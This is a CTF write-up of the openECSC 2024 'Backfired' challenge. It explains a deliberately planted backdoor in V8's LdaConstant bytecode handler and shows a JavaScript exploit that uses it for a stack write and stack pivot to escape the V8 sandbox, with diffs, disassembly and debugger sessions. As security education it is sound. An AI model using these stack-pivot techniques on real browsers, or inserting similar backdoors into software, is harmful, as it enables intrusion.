# openECSC 2024 - Final Round

## [pwn] Backfired (4 solves)

I think someone backdoored my browser... 🤔🤨

`nc backfired.challs.open.ecsc2024.it 47003`

Author: Marco Bonelli <@mebeim>

### Description

The challenge consists of a few patches to V8 source code. The first one
[`00_chall.patch`](./src/patches/00_chall.patch) adds some interesting code to
the `LdaConstant` [Ignition][v8-ignition] bytecode opcode handler in
`src/interpreter/interpreter-generator.cc`:

```diff
 // Load constant literal at |idx| in the constant pool into the accumulator.
 IGNITION_HANDLER(LdaConstant, InterpreterAssembler) {
   TNode<Object> constant = LoadConstantPoolEntryAtOperandIndex(0);
+  TNode<Object> acc = GetAccumulator();
+  Label nope(this);
+
+  GotoIf(TaggedIsSmi(acc), &nope);
+  GotoIfNot(IsHeapNumber(CAST(acc)), &nope);
+
+  TNode<Float64T> acc_value = LoadHeapNumberValue(CAST(acc));
+  GotoIfNot(Float64Equal(acc_value, Float64Constant(1337.1337)), &nope);
+
+  StoreRegisterAtOperandIndex(constant, 0);
+  Dispatch();
+
+  BIND(&nope);
   SetAccumulator(constant);
   Dispatch();
 }
```

The `LdaConstant` should simply take one 1-byte operand unsigned representing
the index of a constant in the bytecode constant pool. It should then load said
constant from the constant pool into the accumulator. The new code however is
first checking whether the current accumulator value is a `HeapNumber` with a
specific value (`1337.1337`), and in such case doing a completely different
operation instead. As the challenge description implies, this looks like a
"backdoor".

This first patch also modifies `BytecodeArrayBuilder::GetConstantPoolEntry` in
`src/interpreter/bytecode-array-builder.cc`. Despite the name, this method is
used to add the values into the pool when building it, and not to retrieve them
later on. The aptch disallows the number `1337.1337` being added to bytecode
constant pools *as is*. If this number is seen when the pool is being built, the
next smallest `double` higher than `1337.1337` is added instead:

```diff
 size_t BytecodeArrayBuilder::GetConstantPoolEntry(double number) {
+  if (number == 1337.1337)
+    number = std::nextafter(number, std::numeric_limits<double>::infinity());
   return constant_array_builder()->Insert(number);
 }
```

The second patch [`01_goal.patch`](./src/patches/01_goal.patch) provides a clear
goal for the challenge: demonstrating a sandbox escape. A piece of code is added
to the signal handler installed by V8 when the
[sandbox testing][v8-sandbox-testing] mode is enabled using `--sandbox-testing`
in the `d8` command line, which is what the provided challenge script does.

When a sandbox violation is detected in `CrashFilter()` we get a flag printed
out to standard error:

```patch
@@ -724,6 +751,8 @@ void CrashFilter(int signal, siginfo_t* info, void* void_context) {
   UninstallCrashFilter();

   PrintToStderr("\n## V8 sandbox violation detected!\n\n");
+  PrintToStderr("Congrats! Here's your prize:\n");
+  PrintFlag();
 }
```

The final patch
[`02_plz_no_unintended.patch`](./src/patches/02_plz_no_unintended.patch) only
removes some debugging and ES6 module import functionality from `d8` code to
avoid common unintended solutions like importing files directly. Nonetheless,
as we can see from the [`chall.sh`](./src/chall.sh) wrapper script, flags are
also written to files with random names under `/tmp`.

### Bug

Let's take a look at the code added in the first patch, particularly at the
operation performed if the magic `1337.1337` value is found in the accumulator
when `LdaConstant` is executed:

```c++
// Load constant literal at |idx| in the constant pool into the accumulator.
IGNITION_HANDLER(LdaConstant, InterpreterAssembler) {
  TNode<Object> constant = LoadConstantPoolEntryAtOperandIndex(0);
  // ...
  StoreRegisterAtOperandIndex(constant, 0);
  Dispatch();
  // ...
}
```

From the comment above the handler, it is clear the the first and only operand
to the `LdaConstant` opcode should be an index into the constant pool. It is in
fact immediately used by `LoadConstantPoolEntryAtOperandIndex(0)` to load the
constant. However, if the backdoor check is passed, the code will call
`StoreRegisterAtOperandIndex(constant, 0)` instead.

Looking at [`InterpreterAssembler::StoreRegisterAtOperandIndex()`][v8-src-1] we
can see:

```c++
void InterpreterAssembler::StoreRegisterAtOperandIndex(TNode<Object> value,
                                                       int operand_index) {
  StoreRegister(value, BytecodeOperandReg(operand_index));
}
```

Therefore, the first operand (`operand_index == 0`) is now being interpreted as
a register. This is unexpected, and in fact the
[`00_chall.patch`](./src/patches/00_chall.patch) also removes some `DCHECK()`
debug assertions that would trigger in debug builds:

```diff
@@ -513,8 +513,6 @@ TNode<Int32T> InterpreterAssembler::BytecodeOperandSignedQuad(

 TNode<Int32T> InterpreterAssembler::BytecodeSignedOperand(
     int operand_index, OperandSize operand_size) {
-  DCHECK(!Bytecodes::IsUnsignedOperandType(
-      Bytecodes::GetOperandType(bytecode_, operand_index)));
   switch (operand_size) {
     case OperandSize::kByte:
       return BytecodeOperandSignedByte(operand_index);
@@ -638,8 +636,6 @@ TNode<UintPtrT> InterpreterAssembler::BytecodeOperandConstantPoolIdx(
 }

 TNode<IntPtrT> InterpreterAssembler::BytecodeOperandReg(int operand_index) {
-  DCHECK(Bytecodes::IsRegisterOperandType(
-      Bytecodes::GetOperandType(bytecode_, operand_index)));
   OperandSize operand_size =
       Bytecodes::GetOperandSize(bytecode_, operand_index, operand_scale());
   return ChangeInt32ToIntPtr(
```

Ignition bytecode is trusted by the interpreter, and in fact the bytecode itself
is stored outside the V8 sandbox (`BytecodeArray` is a subclass of
[`ExposedTrustedObject`][v8-src-2]). If the sandbox works as intended, it should
never be possible to alter the bytecode even with full R/W in the sandbox.
However, this alteration is baked in at compile time in the source code,
effectively forcing the interpreter to confuse a constant pool index with a
bytecode operand index and do something that it shouldn't.

Being part of the bytecode, register indexes are also trusted by the Ignition
interpreter (only some assumptions are checked by the assembler with
`DCHECK()`). When the interpreter runs, bytecode registers are stored directly
on the V8 stack, and bytecode handlers perform no bound checks when indexing the
stack to access them. This means that such a "bug" can cause controlled stack
corruption.


### Solution

TL;DR jump to the commented [exploit code](./src/expl.js) if you want something
shorter and to the point.

The `d8` binary is invoked with `--sandbox-testing` and we need to demonstrate a
sandbox bypass by accessing the page at the address given by
`Sandbox.targetPage`. The page is mapped at startup by `d8` here:

```cpp
    // Map the target address that must be written to to demonstrate a sandbox
    // bypass. A simple way to enforce that the access is a write (or execute)
    // access is by mapping the page readable. That way, read accesses do not
    // cause a crash and so won't be seen by the crash filter at all.
    VirtualAddressSpace* vas = GetPlatformVirtualAddressSpace();
    target_page_size_ = vas->page_size();
    target_page_base_ =
        vas->AllocatePages(vas->RandomPageAddress(), target_page_size_,
                           target_page_size_, PagePermissions::kRead);
    CHECK_NE(target_page_base_, kNullAddress);
```

> [!NOTE]
> **Author's note**: unfortunately a typo in
> [`01_goal.patch`](./src/patches/01_goal.patch) makes `d8` print the sandbox
> testing banner `Read from or write to the page [...]` while it should actually
> print `Fetch from or write to the page [...]`. The page is in fact mapped
> read-only, so a read would not do much. A write or instruction fetch though
> would fault.

The exploitation strategy after triggering the bug is one that was already
explored in previus CTF challenges like Google CTF 2023 Quals "v8box": pivoting
the V8 stack in the (controlled) sandbox heap. Let's get there first though.

This is what a *normal* `LdaConstant` opcode handler looks like:

```c++
IGNITION_HANDLER(LdaConstant, InterpreterAssembler) {
  // 00000000026b03c0 <Builtins_LdaConstantHandler>:
  //   r12 = BytecodeArray
  //   r9  = bytecode program counter
  //   rax = accumulator

  TNode<Object> constant = LoadConstantPoolEntryAtOperandIndex(0);
  SetAccumulator(constant);
  // 26b03c0:  movzx  ebx,BYTE PTR [r12+r9*1+0x1]     ; Load first operand (constant pool idx)
  // 26b03c6:  mov    edx,DWORD PTR [r12+0x17]        ; Load constant pool (TrustedFixedArray)
  // 26b03cb:  or     rdx,QWORD PTR [r13+0x1e0]
  // 26b03d2:  mov    eax,DWORD PTR [rdx+rbx*4+0x7]   ; accumulator = pool[idx]
  // 26b03d6:  add    rax,r14

  Dispatch();
  // 26b03d9:  add    r9,0x2                          ; Advance PC to next opcode
  // 26b03dd:  movzx  ebx,BYTE PTR [r9+r12*1]
  // 26b03e2:  cmp    bl,0xbb
  // 26b03e5:  jae    26b03ed
  // 26b03e7:  mov    rcx,QWORD PTR [r15+rbx*8]       ; Load next opcode handler
  // 26b03eb:  jmp    rcx
  // 26b03ed:  mov    rdx,rbp
  // 26b03f0:  mov    QWORD PTR [rdx+rbx*8-0x688],rax
  // 26b03f8:  add    r9,0x1
  // 26b03fc:  movzx  ebx,BYTE PTR [r9+r12*1]
  // 26b0401:  mov    rcx,QWORD PTR [r15+rbx*8]
  // 26b0405:  jmp    rcx
}
```

<sup>The larger amount of machine code generated for `Dispatch()` with
seemingly duplicated code to jump to the next handler (`jmp rcx`) has to do with
[short Star lookahead][v8-src-3].</sup>

This is the patched version in the `d8` binary of the challenge:

```c++
IGNITION_HANDLER(LdaConstant, InterpreterAssembler) {
  // 0000000000ffdf00 <Builtins_LdaConstantHandler>:
  //   r12 = BytecodeArray
  //   r9  = bytecode program counter
  //   rax = accumulator

  TNode<Object> constant = LoadConstantPoolEntryAtOperandIndex(0);
  // ffdf00:  movzx  ebx,BYTE PTR [r12+r9*1+0x1]     ; Load first operand (constant pool idx)
  // ffdf06:  mov    edx,DWORD PTR [r12+0x17]        ; Load constant pool (TrustedFixedArray)
  // ffdf0b:  or     rdx,QWORD PTR [r13+0x1e0]
  // ffdf12:  mov    ebx,DWORD PTR [rdx+rbx*4+0x7]   ; constant = pool[idx]
  // ffdf16:  add    rbx,r14

  TNode<Object> acc = GetAccumulator();
  Label nope(this);
  GotoIf(TaggedIsSmi(acc), &nope);
  // ffdf19:  test   al,0x1
  // ffdf1b:  je     ffdf45

  GotoIfNot(IsHeapNumber(CAST(acc)), &nope);
  // ffdf1d:  mov    edx,DWORD PTR [rax-0x1]         ; Load map
  // ffdf20:  cmp    DWORD PTR [r13+0x2d8],edx       ; IsHeapNumber(CAST(acc))
  // ffdf27:  jne    ffdf45

  TNode<Float64T> acc_value = LoadHeapNumberValue(CAST(acc));
  // ffdf29:  movsd  xmm0,QWORD PTR [rax+0x3]

  GotoIfNot(Float64Equal(acc_value, Float64Constant(1337.1337)), &nope);
  // ffdf2e:  movabs r10,0x4094e488e8a71de7          ; Load 1337.1337
  // ffdf38:  movq   xmm1,r10
  // ffdf3d:  ucomisd xmm1,xmm0                      ; Compare with acc_value
  // ffdf41:  jp     ffdf45                          ; (NaN check)
  // ffdf43:  je     ffdf82

  StoreRegisterAtOperandIndex(constant, 0);
  // ffdf82:  movsx  rdx,BYTE PTR [r12+r9*1+0x1]     ; Load first operand (constant pool idx)
  // ffdf88:  mov    rsi,rbp
  // ffdf8b:  mov    QWORD PTR [rsi+rdx*8],rbx       ; Write to stack indexing with operand value!!!

  Dispatch();
  // ...

  BIND(&nope);
  SetAccumulator(constant);
  Dispatch();
  // ...
}
```

As we can see from the disassembled code of `Builtins_LdaConstantHandler`, the
`StoreRegisterAtOperandIndex(constant, 0)` directly translates to a RBP-relative
write to the stack using the `constant` taken from the bytecode constant pool.
No bound check is performed, therefore if we can control the index operand of
`LdaConstant` we can control where to write on the stack. Furthermore, we can
also control *what* to write (the `constant` itself).

Let's create a simple JS function to test this. The naïve check in
`BytecodeArrayBuilder::GetConstantPoolEntry()` prevents us from directly writing
`1337.1337` in the body of the function: it would go in the constant pool and
its value would change. However we can just calculate it with simple math.

```js
// x.js
function f(x) {
    let a = 1336.1337 + x;
    g = 69.420;
}
```

If we run `./d8 --allow-natives-syntax --shell x.js` we can inspect the JS
objects from the `d8` shell. First, call `f()` once to compile it to Ignition
bytecode, then inspect it:

```none
d8> f(0)
undefined
d8> %DebugPrint(f)
DebugPrint: 0x87b00190d3d: [Function] in OldSpace
 - map: 0x087b00180931 <Map[32](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x087b00180859 <JSFunction (sfi = 0x87b00141879)>
 [... a bunch of stuff ...]
 - code: 0x087b00016fe1 <Code BUILTIN InterpreterEntryTrampoline>
 - dispatch_handle: 2419200
 - interpreted
 - bytecode: 0x1f9d000407a1 <BytecodeArray[16]>
 - source code: (x) {
        let a = 1336.1337 + x;
        g = 69.420;
}
 - properties: 0x087b00000775 <FixedArray[0]>
 [... a bunch more stuff ...]
```

What we are really interested in is the `bytecode` that was just created:

```none
d8> %DebugPrintPtr(0x1f9d000407a1)
DebugPrint: 0x1f9d000407a1: [BytecodeArray]
 - map: 0x087b00000971 <Map(BYTECODE_ARRAY_TYPE)>
Parameter count 2
Register count 2
Frame size 16
         0x1f9d000407c8 @    0 : 13 00             LdaConstant [0]
         0x1f9d000407ca @    2 : c9                Star1
         0x1f9d000407cb @    3 : 0b 03             Ldar a0
         0x1f9d000407cd @    5 : 3b f8 00          Add r1, [0]
         0x1f9d000407d0 @    8 : ca                Star0
         0x1f9d000407d1 @    9 : 13 01             LdaConstant [1]
         0x1f9d000407d3 @   11 : 23 02 01          StaGlobal [2], [1]
         0x1f9d000407d6 @   14 : 0e                LdaUndefined
         0x1f9d000407d7 @   15 : af                Return
Constant pool (size = 3)
0x1f9d0004078d: [TrustedFixedArray]
 - map: 0x087b000005e5 <Map(TRUSTED_FIXED_ARRAY_TYPE)>
 - length: 3
           0: 0x087b00191a59 <HeapNumber 1336.13>
           1: 0x087b00191a65 <HeapNumber 69.42>
           2: 0x087b00002979 <String[1]: #g>
Handler Table (size = 0)
[... a bunch more stuff ...]
```

As we can see, `LdaConstant [1]` will load `69.420` from index 1 in the constant
pool. If we call `f(1)` the code will calculate `1336.1337 + 1` and store it in
the accumulator with `Add r1, [0]` before copying the accumulator to the local
`a` variable with `Star0` (which apparently was assigned register 0).

Let's bring out GDB ([pwndbg][pwndbg]) to inspect what is going on. Launch the
`d8` shell in one terminal, then attach to it:

```none
$ gdb --pid $(pidof d8)
pwndbg> file dist/d8
Reading symbols from dist/d8...
pwndbg> b Builtins_LdaConstantHandler
Breakpoint 1 at 0x62b8aa821f00
pwndbg> c
Continuing.
```

Now run `f(1)` and hit the breakpoint (we have two `LdaConstant` opcodes, so
skip the first one). The situation looks like this:

```none
► 0x62b8aa821f00 <Builtins_LdaConstantHandler>       movzx  ebx, byte ptr [r12 + r9 + 1]
[...]
pwndbg> stack 25
00:0000│ rsp 0x7ffc026c2698 —▸ 0x62b8aa6aeb47 (Builtins_InterpreterEntryTrampoline+263) ◂— mov r12, qword ptr [rbp - 0x20]
01:0008│-040 0x7ffc026c26a0 —▸ 0x87b00191a59 ◂— 0x88e8a71de7000005
02:0010│-038 0x7ffc026c26a8 —▸ 0x87b00044785 ◂— 0x88e8a71de7000005
03:0018│-030 0x7ffc026c26b0 —▸ 0x87b00000069 ◂— 4
04:0020│-028 0x7ffc026c26b8 ◂— 0x4e /* 'N' */
05:0028│-020 0x7ffc026c26c0 —▸ 0x1f9d000407a1 ◂— 0x2000402400000009 /* '\t' */
06:0030│-018 0x7ffc026c26c8 ◂— 2
07:0038│-010 0x7ffc026c26d0 —▸ 0x87b00190d3d ◂— 0x7500000775001809
08:0040│-008 0x7ffc026c26d8 —▸ 0x87b001801a1 ◂— 0xd90000025a001801
09:0048│ rbp 0x7ffc026c26e0 —▸ 0x7ffc026c2748 —▸ 0x7ffc026c2778 —▸ 0x7ffc026c27f0 —▸ 0x7ffc026c2950 ◂— ...
0a:0050│+008 0x7ffc026c26e8 —▸ 0x62b8aa6aeb47 (Builtins_InterpreterEntryTrampoline+263) ◂— mov r12, qword ptr [rbp - 0x20]
0b:0058│+010 0x7ffc026c26f0 —▸ 0x87b00180141 ◂— 0x750001996c0018f9
0c:0060│+018 0x7ffc026c26f8 ◂— 2
0d:0068│+020 0x7ffc026c2700 ◂— 2
0e:0070│+028 0x7ffc026c2708 —▸ 0x87b00190d3d ◂— 0x7500000775001809
0f:0078│+030 0x7ffc026c2710 —▸ 0x87b00000069 ◂— 4
10:0080│+038 0x7ffc026c2718 —▸ 0x87b00000069 ◂— 4
11:0088│+040 0x7ffc026c2720 ◂— 0x5c /* '\\' */
12:0090│+048 0x7ffc026c2728 —▸ 0x1f9d00040865 ◂— 0x1a00402a00000009 /* '\t' */
13:0098│+050 0x7ffc026c2730 ◂— 2
14:00a0│+058 0x7ffc026c2738 —▸ 0x87b00191de1 ◂— 0x7500000775001809
15:00a8│+060 0x7ffc026c2740 —▸ 0x87b001801a1 ◂— 0xd90000025a001801
16:00b0│+068 0x7ffc026c2748 —▸ 0x7ffc026c2778 —▸ 0x7ffc026c27f0 —▸ 0x7ffc026c2950 —▸ 0x7ffc026c29c0 ◂— ...
17:00b8│+070 0x7ffc026c2750 —▸ 0x62b8aa6ac59c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
18:00c0│+078 0x7ffc026c2758 —▸ 0x87b00180141 ◂— 0x750001996c0018f9
```

We can see the argument we passed (`1`): it's a SMI so its value is left-shifted
by 1 and thus we get `2`. It's sitting at `rbp + 8 * 3` (`0x7ffc026c26f8`). In
fact, as we can see from the bytecode dump above, the opcode to load it is
`Ldar a0` or `0b 03` in raw bytes, where `03` is the opcode operand (register
number).

Furthermore, we can see that the accumulator (`rax`) contains what we want: a
`HeapNumber` with value `1337.1337`.

```none
pwndbg> i r rax
rax            0x87b00044785       9324374280069
pwndbg> x/gf $rax - 1 + 4
0x87b00044788:  1337.1337000000001
```

We will therefore pass the check and execute the backdoor code at
`Builtins_LdaConstantHandler+130`. Let's hit it:

```none
pwndbg> b *(Builtins_LdaConstantHandler+130)
Breakpoint 2 at 0x62b8aa821f82
pwndbg> c
Continuing.
   [...]
 ► 0x62b8aa821f82 <Builtins_LdaConstantHandler+130>    movsx  rdx, byte ptr [r12 + r9 + 1]
   0x62b8aa821f88 <Builtins_LdaConstantHandler+136>    mov    rsi, rbp
   0x62b8aa821f8b <Builtins_LdaConstantHandler+139>    mov    qword ptr [rsi + rdx*8], rbx
   [...]
```

The constant we loaded is in `rbx` and the index of the `LdaConstant` we are
performing is being loaded in `rdx`.

```none
pwndbg> ni
 ► 0x62b8aa821f88 <Builtins_LdaConstantHandler+136>    mov    rsi, rbp
   0x62b8aa821f8b <Builtins_LdaConstantHandler+139>    mov    qword ptr [rsi + rdx*8], rbx
   [...]
pwndbg> i r rbx
rbx            0x87b00191a65       9324375644773
pwndbg> i r rdx
rdx            0x1                 1
pwndbg> x/gf $rbx - 1 + 4
0x87b00191a68:  69.420000000000002
```

We now have a RBP-relativa stack write of a controlled `HeapNumber` (`69.420` in
this case). All that's left to do is get the correct index to corrupt either the
saved return address or the saved RBP on the stack.

Unfortunately, we cannot exactly write whatever we want on the stack. We are
limited by JS object: either we write a SMI (Small Integer) that is only going
to be 32 bit (with LSB = 0) or we write an object (`HeapNumber` or any other
normal untrusted `HeapObject` really). In the first case (SMI) we cannot control
the high 32 bits and therefore we cannot write a valid address anywhere. In the
second case we can write a valid address but not an arbitrary one: it will be
the address of an object in the sandbox. We have full R/W access to the sandbox
through `Sandbox.MemoryView`, so this second option is good enough if we want to
overwrite RBP and pivot the stack to a controller memory region.

The saved RBP we want to target is this one:

```none
             vvvvvvvvvvvvvv
16:00b0│+068 0x7ffc026c2748 —▸ 0x7ffc026c2778 —▸ 0x7ffc026c27f0 —▸ 0x7ffc026c2950 —▸ 0x7ffc026c29c0 ◂— ...
17:00b8│+070 0x7ffc026c2750 —▸ 0x62b8aa6ac59c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
```

It appears to be at `rbp + 8 * 14` so the constant pool index we want is `14`.
We can write a function with a few more constants to get the index we want.
Constants are put in the constant pool array more or less in the same order they
appear in the enclosing function, so this is straightforward.

> [!NOTE]
> The space in the stack frame of the Ignition opcode handler may change due to
> the code we write (inside or even outside the function), so the index may need
> a second adjustment. In the above example we needed `rbp + 8 * 14`, but for my
> final exploit script it ended up being `rbp + 8 * 18` instead. YMMV.

```js
// x.js
function f(x) {
    g0 = 1.1;
    g1 = 2.2;
    g3 = 3.3;
    g4 = 4.4;
    g5 = 5.5;
    g6 = 6.60;
    g6 = 6.61;

    let a = 1336.1337 + x;
    g = 69.420;
}
```

```none
./d8 --allow-natives-syntax --shell x.js
d8> f(0)
undefined
d8> %DebugPrint(f0)
[...]
 - bytecode: 0x259b000400f1 <BytecodeArray[51]>
[...]
d8> %DebugPrintPtr(0x259b000400f1)
DebugPrint: 0x259b000400f1: [BytecodeArray]
 - map: 0x12e600000971 <Map(BYTECODE_ARRAY_TYPE)>
Parameter count 2
Register count 2
Frame size 16
         0x259b00040118 @    0 : 13 00             LdaConstant [0]
         0x259b0004011a @    2 : 23 01 00          StaGlobal [1], [0]
         0x259b0004011d @    5 : 13 02             LdaConstant [2]
         0x259b0004011f @    7 : 23 03 02          StaGlobal [3], [2]
         0x259b00040122 @   10 : 13 04             LdaConstant [4]
         0x259b00040124 @   12 : 23 05 04          StaGlobal [5], [4]
         0x259b00040127 @   15 : 13 06             LdaConstant [6]
         0x259b00040129 @   17 : 23 07 06          StaGlobal [7], [6]
         0x259b0004012c @   20 : 13 08             LdaConstant [8]
         0x259b0004012e @   22 : 23 09 08          StaGlobal [9], [8]
         0x259b00040131 @   25 : 13 0a             LdaConstant [10]
         0x259b00040133 @   27 : 23 0b 0a          StaGlobal [11], [10]
         0x259b00040136 @   30 : 13 0c             LdaConstant [12]
         0x259b00040138 @   32 : 23 0b 0a          StaGlobal [11], [10]
         0x259b0004013b @   35 : 13 0d             LdaConstant [13]
         0x259b0004013d @   37 : c9                Star1
         0x259b0004013e @   38 : 0b 03             Ldar a0
         0x259b00040140 @   40 : 3b f8 0c          Add r1, [12]
         0x259b00040143 @   43 : ca                Star0
         0x259b00040144 @   44 : 13 0e             LdaConstant [14]
         0x259b00040146 @   46 : 23 0f 0d          StaGlobal [15], [13]
         0x259b00040149 @   49 : 0e                LdaUndefined
         0x259b0004014a @   50 : af                Return
Constant pool (size = 16)
0x259b000400a9: [TrustedFixedArray]
 - map: 0x12e6000005e5 <Map(TRUSTED_FIXED_ARRAY_TYPE)>
 - length: 16
           0: 0x12e600190f3d <HeapNumber 1.1>
           1: 0x12e600190c45 <String[2]: #g0>
           2: 0x12e600190f49 <HeapNumber 2.2>
           3: 0x12e600190c55 <String[2]: #g1>
           4: 0x12e600190f55 <HeapNumber 3.3>
           5: 0x12e600190c65 <String[2]: #g3>
           6: 0x12e600190f61 <HeapNumber 4.4>
           7: 0x12e600190c75 <String[2]: #g4>
           8: 0x12e600190f6d <HeapNumber 5.5>
           9: 0x12e600190c85 <String[2]: #g5>
          10: 0x12e600190f79 <HeapNumber 6.6>
          11: 0x12e600190c95 <String[2]: #g6>
          12: 0x12e600190f85 <HeapNumber 6.61>
          13: 0x12e600190f91 <HeapNumber 1336.13>
          14: 0x12e600190f9d <HeapNumber 69.42>     <==== Nice
          15: 0x12e600002979 <String[1]: #g>
Handler Table (size = 0)
[...]
```

Perfect! Now technically we are rewriting RBP and pivoting the stack to the
address of `69.420` (i.e. `0x12e600190f9d`) after a couple of functions returns
from `Builtins_LdaConstantHandler`. The address of the constant is in the
sandbox and we have full R/W access to it through the `Sandbox` object provided
by `--sandbox-testing`. We can therefore write a ROP chain inside the object. We
can either do this *direcly* in the function or bring the `HeapNumber` reference
outside the function through a global variable.

We cannot really execute a real valid ROP chain since we don't have a leak and
therefore no gadgets yet. We could work on one, or we could simply return into
`Sandbox.targetPage` to cause an access violation (the page is not executable)
and get the flag regardless.

```js
function f(x) {
    g0 = 1.1;
    g1 = 2.2;
    g3 = 3.3;
    g4 = 4.4;
    g5 = 5.5;
    g6 = 6.60;
    g6 = 6.61;

    let a = 1336.1337 + x; // Will set accumulator to 1337.1337 if x is 1
    g = 69.420;            // Will overwrite saved RBP

    newStackAddr = Sandbox.getAddressOf(g);
}

f(0); // Does not trigger backdoor

const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));
// Point next RET instruction after stack pivot to target page
mem.setBigUint64(newStackAddr + 9, BigInt(Sandbox.targetPage), true);

f(1); // Triggers backdoor
```

Apart from adjusting the constant pool index of `69.420` to get the right offset
to overwrite the saved RBP, which again could have moved around since the code
we have now is different, this is all we need. If we hit RBP correctly, we will
trigger a sandbox violation and get the flag:

```none
Sandbox testing mode is enabled. Read from or write to the page starting at 0x3c6d1f531000 (available from JavaScript as `Sandbox.targetPage`) to demonstrate a sandbox bypass.

## V8 sandbox violation detected!

Congrats! Here's your prize:
openECSC{9c4193ea_L00ks_l1ke_my_1gn1t10n_b4ckd00r_b4ckf1r3d!_b69c7b5a}


Received signal 11 SEGV_ACCERR 3c6d1f531000

==== C stack trace ===============================

 [0x63a6a18386b3]
 [0x63a6a1838602]
 [0x7b66dba45320]
 [0x3c6d1f531000]
[end of stack trace]
```

### Complete exploit

See [`src/expl.js`](src/expl.js) for the JS exploit source code and
[`checker/__main__.py`](checker/__main__.py) for the automated script that
uploads the exploit to the challenge server.


[v8-ignition]: https://v8.dev/docs/ignition
[v8-sandbox-testing]: https://v8.dev/blog/sandbox#testing
[v8-src-1]: https://source.chromium.org/chromium/chromium/src/+/171e9a61e56a06c99d9f65df40f59f340827b6e6:v8/src/interpreter/interpreter-assembler.cc;l=333?q=StoreRegisterAtOperandIndex&ss=chromium%2Fchromium%2Fsrc:v8%2F
[v8-src-2]: https://source.chromium.org/chromium/chromium/src/+/171e9a61e56a06c99d9f65df40f59f340827b6e6:v8/src/objects/trusted-object.h;l=101;drc=652ce146e0992e34bda5dd8e75142a86b4eebcf1;bpv=0;bpt=1
[v8-src-3]: https://source.chromium.org/chromium/chromium/src/+/171e9a61e56a06c99d9f65df40f59f340827b6e6:v8/src/interpreter/interpreter-assembler.cc;drc=652ce146e0992e34bda5dd8e75142a86b4eebcf1;bpv=0;bpt=1;l=1289
[v8-src-4]: https://source.chromium.org/chromium/chromium/src/+/171e9a61e56a06c99d9f65df40f59f340827b6e6:v8/src/sandbox/testing.cc;l=818;drc=82536afb4dfb2305b04da255190b25043e8f2a4d
[pwndbg]: https://github.com/pwndbg/pwndbg
